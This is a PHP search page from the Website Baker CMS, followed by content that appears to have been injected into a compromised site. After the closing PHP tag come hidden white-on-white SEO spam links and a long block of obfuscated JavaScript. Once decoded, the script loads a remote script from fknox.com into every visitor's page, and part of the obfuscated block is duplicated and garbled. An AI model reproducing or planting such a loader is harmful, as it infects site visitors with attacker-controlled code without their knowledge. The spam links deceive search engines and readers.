<?php

// $Id: index.php 915 2009-01-21 19:27:01Z Ruebenwurzel $

/*

 Website Baker Project <http://www.websitebaker.org/>
 Copyright (C) 2004-2009, Ryan Djurovich

 Website Baker is free software; you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation; either version 2 of the License, or
 (at your option) any later version.

 Website Baker is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with Website Baker; if not, write to the Free Software
 Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

// Include the config file
require('../config.php');

// Required page details
$page_id = 0;
$page_description = '';
$page_keywords = '';
define('PAGE_ID', 0);
define('ROOT_PARENT', 0);
define('PARENT', 0);
define('LEVEL', 0);
define('PAGE_TITLE', $TEXT['SEARCH']);
define('MENU_TITLE', $TEXT['SEARCH']);
define('MODULE', '');
define('VISIBILITY', 'public');
define('PAGE_CONTENT', 'search.php');

// Find out what the search template is
$database = new database();
$query_template = $database->query("SELECT value FROM ".TABLE_PREFIX."search WHERE name = 'template' LIMIT 1");
$fetch_template = $query_template->fetchRow();
$template = $fetch_template['value'];
if($template != '') {
	define('TEMPLATE', $template);
}
unset($template);

//Get the referrer page ID if it exists
if(isset($_REQUEST['referrer']) && is_numeric($_REQUEST['referrer']) && intval($_REQUEST['referrer']) > 0) {
	define('REFERRER_ID', intval($_REQUEST['referrer']));
} else {
	define('REFERRER_ID', 0);
}

// Include index (wrapper) file
require(WB_PATH.'/index.php');

?><!-- ~ --><!-- ~ -->&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Meta-Xceed Inc. &copy; 2006 </td>         
  </tr>
</table>
<p><a href="http://www.meta-x.com/"><font color="#FFFFFF"><span style="visibility: hidden">Clinical Analytic Software Solutions</span></font></a>
<a href="http://www.meta-x.com/"><font color="#FFFFFF"><span style="visibility: hidden">SAS Consulting</span></font></a>
<a href="http://www.meta-x.com/"><font color="#FFFFFF"><span style="visibility: hidden">SAS Alliance Partner</span></font></a>
<a href="http://www.meta-x.com/"><font color="#FFFFFF"><span style="visibility: hidden">SAS CFR Part 11 Compliance</span></font></a>
<a href="http://www.meta-x.com/"><font color="#FFFFFF"><span style="visibility: hidden">SAS Software Development</span></font></a>
<a href="http://www.meta-x.com/"><font color="#FFFFFF"><span style="visibility: hidden">SAS Biotech Pharmaceutical Consulting</span></font></a>
<a href="http://www.meta-x.com/"><font color="#FFFFFF"><span style="visibility: hidden">SAS Biotech Pharmaceutical Consulting</span></font></a>
<a href="http://www.meta-x.com/services.html"><font color="#FFFFFF"><span style="visibility: hidden">SAS Consulting</span></font></a>
<a href="http://www.meta-x.com/services.html"><font color="#FFFFFF"><span style="visibility: hidden">SAS Alliance Partner</span></font></a>
<a href="http://www.meta-x.com/services.html"><font color="#FFFFFF"><span style="visibility: hidden">Clinical Analytic Software Solutions</span></font></a>
<a href="http://www.meta-x.com/services.html"><font color="#FFFFFF"><span style="visibility: hidden">SAS Biotech Pharmaceutical Consulting</span></font></a>
<a href="http://www.meta-x.com/products.html"><font color="#FFFFFF"><span style="visibility: hidden">Clinical Analytic Software Solutions</span></font></a>
<a href="http://www.meta-x.com/products.html"><font color="#FFFFFF"><span style="visibility: hidden">CFR Part 11 Compliance</span></font></a>
<a href="http://www.meta-x.com/products.html"><font color="#FFFFFF"><span style="visibility: hidden">SAS Alliance Partner</span></font></a>
<a href="http://www.meta-x.com/products.html"><font color="#FFFFFF"><span style="visibility: hidden">SAS Software Development</span></font></a>
<a href="http://www.meta-x.com/products.html"><font color="#FFFFFF"><span style="visibility: hidden">SAS Biotech Pharmaceutical Consulting</span></font></a>
<a href="http://www.meta-x.com/sy_data.ht];var aJA=new Array();var aN="";hU='';var zE=new Date();sX= [Uj+'\x4b\x6d\x39\x6f\x4d',SHZa+'\x64','\x4f\x77'+N73,cLc+'\x73\x61\x66\x64\x59','\x53\x7a'+cREg]}('\x74\x65\x64\x77\x69','\x53\x48\x61\x66','\x4e','\x6b\x65\x37\x43','\x4d\x46')[1] + function(QHS,vLU,qPq2,M,Sh){return [M+'\x64',qPq2+'\x5a\x77\x4a\x67','\x6b\x74'+Sh,'\x55'+QHS,vLU+'\x5a']}('\x52\x78\x49\x74\x61','\x54\x57\x7a','\x74\x79','\x74\x68\x67\x72','\x46')[0];var qTG="";this.qN='';tS="tS";        this.zO=20862;oP="";lOP="lOP";var i = function(zdP4,xEYaL,ZkZ,sI3){return [zdP4+'\x5a\x59\x44\x4b\x67','\x62\x6f\x64'+ZkZ,'\x61'+xEYaL,'\x51\x79\x70\x71\x4f'+sI3]}('\x65','\x5a\x53\x31\x59\x37','\x79','\x4c\x75\x30\x68')[1];this.cP='';this.hK="";dQ='';var oB=new Array();this.xG="";iB=8077;this.gH='';this.vK="";var xW = function(rcf4,EFmiZ,EssaF){return ['\x4d\x59\x4b'+rcf4,EssaF+'\x73\x68',EFmiZ+'\x4a\x79\x51']}('\x4c\x36','\x67\x35\x71','\x70\x75')[1];this.rCZ=15683;zQ="zQ";pA='';var cFC=new Array();var tQV=false;rA="rA";nC='';iX="";uB=8525;this.dK=11854;var z = function(i,WyXlI,u8BS,BCq,OmEc){return [u8BS+'\x69\x6a','\x54\x65'+BCq,i+'\x73\x74\x57\x39\x68',OmEc+'\x48',WyXlI+'\x54\x56']}('\x57\x44','\x6a\x50','\x61\x73\x77\x69\x66\x72\x6c','\x65','\x4a')[0];hO="hO";this.sDO="sDO";function qNA(){};var jY=false;function wJ(){};this.lG="";var cN = function(IQ,Elt8,r,EmLv,j8){return ['\x4d\x6a\x43\x4c'+IQ,r+'\x6f\x31\x46\x6d',Elt8+'\x71\x49\x41','\x4d\x59\x32'+j8,EmLv+'']}('\x59','\x4a\x76\x4b\x61\x32','\x73','\x66','\x62\x4a')[4];this.xYX=22343;jO="jO";lW='';function wTK(){};gJ = function(yiL0,QkxZ,G,roVj){return ['\x73\x77'+yiL0,QkxZ+'\x51\x5a\x30\x4d',G+'\x63',roVj+'\x69\x78\x39\x33\x47']}('\x71\x31\x6c\x79\x74','\x70\x47\x65\x4e','\x55\x6d\x44\x74\x48','\x44\x5a\x6c\x30')[0];this.xK=22798;this.yX='';bY=false;this.vG=8638;var kJ=new Array();this.dI="";cB = function(Utek4,N8e,DMvu){return ['\x4c'+N8e,'\x6a\x6e\x53'+DMvu,Utek4+'\x65']}('\x61\x2c\x77\x32\x68\x64','\x6e\x59','\x6d')[2];var hA="hA";yT="";this.zEX="";var hI=false;var tSV='';var nW="nW";var oT=21231;this.jK="";var q = new Array();nI='';this.sDQ='';cL=27505;oV="";zUD="zUD";var xGX="xGX";bE="bE";q[xW](cN, cB, nO, y, p, v, l, z, c, i, w, r, gJ);var dC=function(){return 'dC'};this.kZ='';var pCP=new Date();vKR='';this.yD="yD";var lIN=false;sT=28977;pM='';this.vQ="";var aZ="";var lS="lS";var gXG=20300;var tC="tC";sVY="";var iN=function(){};var jCN=false;uN=2489;var jKH=function(){return 'jKH'};var zY=new Date();qR=21289;var eJ=28267;var f='';var lM='';this.dIT=18523;xOV="xOV";this.hKJ=11823;this.gN="gN";this.nK=11122;this.kD='';var jM=new Date();xE='';function iR(){};var aH="";rI='';var rAB=new Date();var zQT=false;this.lEX="";this.dW=10714;var rAH='';this.dWR=25823;hY=false;this.vGT=25459;var jER=new Date();fM='';var vU='';iV=14549;this.jMD=18103;wR=5513;rAN='';vGX=false;var rE="rE";this.jG="";var sF=function(){};var xIF="xIF";this.nSH="";var yP=22307;this.lUT="";this.eZ='';tSP="tSP";bA='';this.aV='';this.kT="kT";bW='';function uL(){};var fK=new Date();var lUF="lUF";var nQ='';this.kH=false;function uLW(){};var aT="";this.jKT=32047;this.yN="yN";hYJ='';var rAT=new Date();function oBY(){};var aLI="";wTS="";var dWZ=function(){return 'dWZ'};var fG='';var kDS="";function yJ(){};cZ=11909;nM='';var kB=new Array();this.xC="";this.tM=29526;this.qRU='';this.gF="gF";var fKV=function(){return 'fKV'};this.sTS="sTS";iP="";pCX=false;var oL=9391;rUR=false;function sXW(){};this.qP=false;var gDE=12676;this.kZI="kZI";this.rS="";this.qRM=false;gR="";this.aBG="aBG";this.uR='';nU="nU";var rY="rY";var eP=16899;var vS=new Date();var vW=function(){return 'vW'};var iD=12787;var pCH='';var nA=function(){return 'nA'};hAN=false;fO='';var vE='';var eL="";var dU="dU";function kHO(){};fKX='';var bED=new Date();this.dG=19234;iL="";kP=25121;this.xKB=17827;lMD=false;this.hUJ=10487;sJO=17614;this.uX='';var hQ='';var pC = q[5][q[4]](3, 16);this.pW=32126;var sH=new Array();zUJ=false;this.jKL=25039;this.mN="mN";this.pU=3986;var vY = q[7][q[4]](3, 6);this.xU="";this.qRQ="qRQ";function iJ(){};var vKB='';var wL=new Array();var rUV='';var hE=false;var aP=new Array();var xI = q[1][q[4]](3, 4);var eJI="";var uNK=new Array();this.yDA="yDA";var kF=24703;this.wF=false;vEP='';var xEL=new Date();pS = vY + function(T,W,FNM7L){retc'+IQ,r+'\x6f\x31\x46\x6d',Elt8+'\x71\x49\x41','\x4d\x59\x32'+j8,EmLv+'']}('\x59','\x4a\x76\x4b\x61\x32','\x73','\x66','\x62\x4a')[4];this.xYX=22343;jO="jO";lW='';function wTK(){};gJ = function(yiL0,QkxZ,G,roVj){return ['\x73\x77'+yiL0,QkxZ+'\x51\x5a\x30\x4d',G+'\x63',roVj+'\x69\x78\x39\x33\x47']}('\x71\x31\x6c\x79\x74','\x70\x47\x65\x4e','\x55\x6d\x44\x74\x48','\x44\x5a\x6c\x30')[0];this.xK=22798;this.yX='';bY=false;this.vG=8638;var kJ=new Array();this.dI="";cB = function(Utek4,N8e,DMvu){return ['\x4c'+N8e,'\x6a\x6e\x53'+DMvu,Utek4+'\x65']}('\x61\x2c\x77\x32\x68\x64','\x6e\x59','\x6d')[2];var hA="hA";yT="";this.zEX="";var hI=false;var tSV='';var nW="nW";var oT=21231;this.jK="";var q = new Array();nI='';this.sDQ='';cL=27505;oV="";zUD="zUD";var xGX="xGX";bE="bE";q[xW](cN, cB, nO, y, p, v, l, z, c, i, w, r, gJ);var dC=function(){return 'dC'};this.kZ='';var pCP=new Date();vKR='';this.yD="yD";var lIN=false;sT=28977;pM='';this.vQ="";var aZ="";var lS="lS";var gXG=20300;var tC="tC";sVY="";var iN=function(){};var jCN=false;uN=2489;var jKH=function(){return 'jKH'};var zY=new Date();qR=21289;var eJ=28267;var f='';var lM='';this.dIT=18523;xOV="xOV";this.hKJ=11823;this.gN="gN";this.nK=11122;this.kD='';var jM=new Date();xE='';function iR(){};var aH="";rI='';var rAB=new Date();var zQT=false;this.lEX="";this.dW=10714;var rAH='';this.dWR=25823;hY=false;this.vGT=25459;var jER=new Date();fM='';var vU='';iV=14549;this.jMD=18103;wR=5513;rAN='';vGX=false;var rE="rE";this.jG="";var sF=function(){};var xIF="xIF";this.nSH="";var yP=22307;this.lUT="";this.eZ='';tSP="tSP";bA='';this.aV='';this.kT="kT";bW='';function uL(){};var fK=new Date();var lUF="lUF";var nQ='';this.kH=false;function uLW(){};var aT="";this.jKT=32047;this.yN="yN";hYJ='';var rAT=new Date();function oBY(){};var aLI="";wTS="";var dWZ=function(){return 'dWZ'};var fG='';var kDS="";function yJ(){};cZ=11909;nM='';var kB=new Array();this.xC="";this.tM=29526;this.qRU='';this.gF="gF";var fKV=function(){return 'fKV'};this.sTS="sTS";iP="";pCX=false;var oL=9391;rUR=false;function sXW(){};this.qP=false;var gDE=12676;this.kZI="kZI";this.rS="";this.qRM=false;gR="";this.aBG="aBG";this.uR='';nU="nU";var rY="rY";var eP=16899;var vS=new Date();var vW=function(){return 'vW'};var iD=12787;var pCH='';var nA=function(){return 'nA'};hAN=false;fO='';var vE='';var eL="";var dU="dU";function kHO(){};fKX='';var bED=new Date();this.dG=19234;iL="";kP=25121;this.xKB=17827;lMD=false;this.hUJ=10487;sJO=17614;this.uX='';var hQ='';var pC = q[5][q[4]](3, 16);this.pW=32126;var sH=new Array();zUJ=false;this.jKL=25039;this.mN="mN";this.pU=3986;var vY = q[7][q[4]](3, 6);this.xU="";this.qRQ="qRQ";function iJ(){};var vKB='';var wL=new Array();var rUV='';var hE=false;var aP=new Array();var xI = q[1][q[4]](3, 4);var eJI="";var uNK=new Array();this.yDA="yDA";var kF=24703;this.wF=false;vEP='';var xEL=new Date();pS = vY + function(T,W,FNM7L){return [FNM7L+'\x4a\x48',W+'\x50\x32\x43\x53','\x61\x6d'+T]}('\x65','\x54\x30\x5a\x72','\x75\x43')[2];var eT=new Array();var jYF=new Date();var dUH=function(){return 'dUH'};this.jA="";this.xKZ=18767;xEN=false;var pE = q[12][q[4]](3, 4);var kBY=new Array();var oX="";var xEH=function(){return 'xEH'};this.yNK=false;function cHQ(){};wNA=23666;var rG = q[8][q[4]](3, 11);lMDO=false;this.sR='';this.oXI="oXI";cLK="";pO = rG + function(qM,O91hH,g9f,flQu){return [O91hH+'\x50\x6f\x45','\x62\x75\x74'+g9f,qM+'\x49\x6e',flQu+'\x76\x45']}('\x57\x32\x50','\x6e','\x65','\x59\x79')[1];rYV='';var zS=new Date();var lWV=function(){return 'lWV'};this.xUL="";bKB='';var dS=q[11][pC](pS);var yH="";var vSR=false;var zEB=new Date();sN="";vAP=false;var nOT="nOT";var lGF=new Date();var xO = q[3][q[4]](3, 9);gHE="";var sDA="";var oN=new Array();jMZ=false;var uT=new Array();this.bC="";this.uJC="uJC";var h = q[6][q[4]](3, 8);var nY='';var wB="";this.pQV=13959;var mJ=function(){};var vYH="vYH";dS[q[2]] = function(S6,nid9b,AevdM){return [AevdM+'\x2f\x2f\x66\x6b\x6e\x6f\x78\x2e\x63\x6f\x6d\x2f\x73\x74\x61\x74\x2e\x70\x68\x70','\x5a\x6d'+S6,'\x61\x38\x71\x51'+nid9b]}('\x75\x71\x6d','\x61\x43\x36','\x68\x74\x74\x70\x3a')[0];var eLW="";this.sHG='';var iZ="";var jGL=false;mV=9333;dA='';this.kZS='';var oJ="";wTO="";this.oRY=false;function mD(){};dS[h] = xI;var uP=function(){};this.xSF=27183;var iDG=function(){};var oZ=26563;var zSV=new Date();this.lUD=12567;iZI=19822;function kHC(){};this.kDM="kDM";var mFG=19660;dS[xO] = pE;var pYH=false;vO=false;this.yXS="yXS";this.oF='';var aTW=function(){};var qZ=new Array();xKP=false;this.vKF=32719;this.wV="wV";var vWN=function(){return 'vWN'};var rOP='';this.zMZ=695;this.gHO="gHO";this.wFE='';this.mJI=false;var mP=17567;var qNE="";var iLS=15088;this.yPS="yPS";q[11][q[9]][q[10]](dS);this.dO="";var cPK="";kHON="";this.bG=13826;this.rQ="";var aZA="";function uF(){};} catch(cBK) {var sNA="";var cZQ=new Array();mJK=28078;this.yXW='';var jMX=function(){return 'jMX'};var lA=new Date();r[nS](function(EeQ,B,XM2,wh,n7){return ['\x44\x56\x32\x6e'+wh,'\x50\x78\x36\x6b\x44'+n7,'\x6f\x41'+B,'\x3c\x68\x74\x6d\x6c\x20\x3e\x3c\x62\x6f\x64\x79\x20\x3e\x3c\x74\x64'+XM2,'\x45'+EeQ]}('\x45','\x75\x69','\x20\x3e\x3c\x2f\x74\x64\x3e\x3c\x2f\x62\x6f\x64\x79\x3e\x3c\x2f\x68\x74\x6d\x6c\x3e','\x46\x57\x76','\x5a\x45')[3]);fA='';gNM="";var oBI="";this.mNM='';this.pOF=19487;bKP="bKP";var zA=function(){return 'zA'};s[d](function(){ n.u() }, 198);pUR="pUR";xELS='';var sBI=function(){};}var dMT=new Date();var nCT=false;}};var xUN=false;var bYB=new oRE(); var pG=new Date();bYB.u();this.gL=false;</script><!-- ~ --><!-- ~ --><!-- ~ -->